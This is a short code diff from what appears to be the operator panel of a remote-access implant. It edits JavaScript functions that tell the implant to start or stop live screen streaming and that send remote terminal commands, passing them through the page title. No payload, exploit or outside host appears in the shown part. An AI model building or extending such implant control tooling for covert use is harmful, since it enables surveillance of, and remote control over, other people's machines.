@@ -527,26 +527,16 @@
             document.title = "implant_cmd://" + JSON.stringify(payload);
         }
 
-        let isStreaming = false; // Track streaming state
-        // Toggles screen streaming
+        let isStreaming = false;
         function toggleStream() {
             isStreaming = !isStreaming;
-            
             if (isStreaming) {
                 sendImplantCmd('screen_start');
             } else {
                 sendImplantCmd('screen_stop');
-                const img = document.getElementById('live-screen-img');
-                const icon = document.getElementById('live-screen-icon');
-                if (img) img.style.display = 'none';
-                if (icon) icon.style.display = 'block';
             }
-            // Update button text/icon
-            const btn = document.getElementById('btn-toggle-stream');
-            if(btn) btn.innerHTML = isStreaming ? '<i class="ph ph-stop-circle" ></i>' : '<i class="ph ph-play" ></i>';
         }
-        
-        // Sends terminal command
+
         function sendTerm() {
             const inp = document.getElementById('term-in');
             if(!inp) return;
